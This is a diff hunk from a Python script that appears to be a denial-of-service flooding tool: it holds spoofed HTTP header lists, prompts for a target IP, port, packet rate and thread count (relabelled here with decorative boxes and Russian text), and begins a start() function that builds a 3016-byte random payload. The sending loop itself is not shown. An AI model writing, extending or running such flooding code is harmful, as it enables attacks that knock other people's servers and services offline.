@@ -62,11 +62,18 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
 "Accept-Language: en-US,en;q=0.5\r\n"]
 
-ip = str(input("\033 [31m[+]\033[33m Target IP:\033[32m => \033[0m"))
-port = int(input("\033[31m[+]\033[33m Port:\033[32m => \033[0m"))
-pack = int(input("\033[31m[+]\033[33m Packet/s:\033[32m => \033[0m"))
-thread = int(input("\033[31m[+]\033[33m Threads:\033[32m => \033[0m"))
-
+print("\033[31m ╔═══\033[33m[ Ваша Цель [IP] ] •")
+ip = str(input("\033[31m ┗━━━━━━\033[92m•> \033[0m"))
+time.sleep(0.5)
+print("\033[31m ╔═══\033[33m[ PORT ] •")
+port = int(input("\033[31m ┗━━━━━━\033[92m•> \033[0m"))
+time.sleep(0.5)
+print("\033[31m ╔═══\033[33m[ Packet [s] ] •")
+pack = int(input("\033[31m ┗━━━━━━\033[92m•> \033[0m"))
+time.sleep(0.5)
+print("\033[31m ╔═══\033[33m[ Потоки [800] Threads  ] •")
+thread = int(input("\033[31m ┗━━━━━━\033[92m•> \033[0m"))
+time.sleep(0.5)
 def start():
     global useragents, ref, acceptall
     hh = random._urandom(3016)
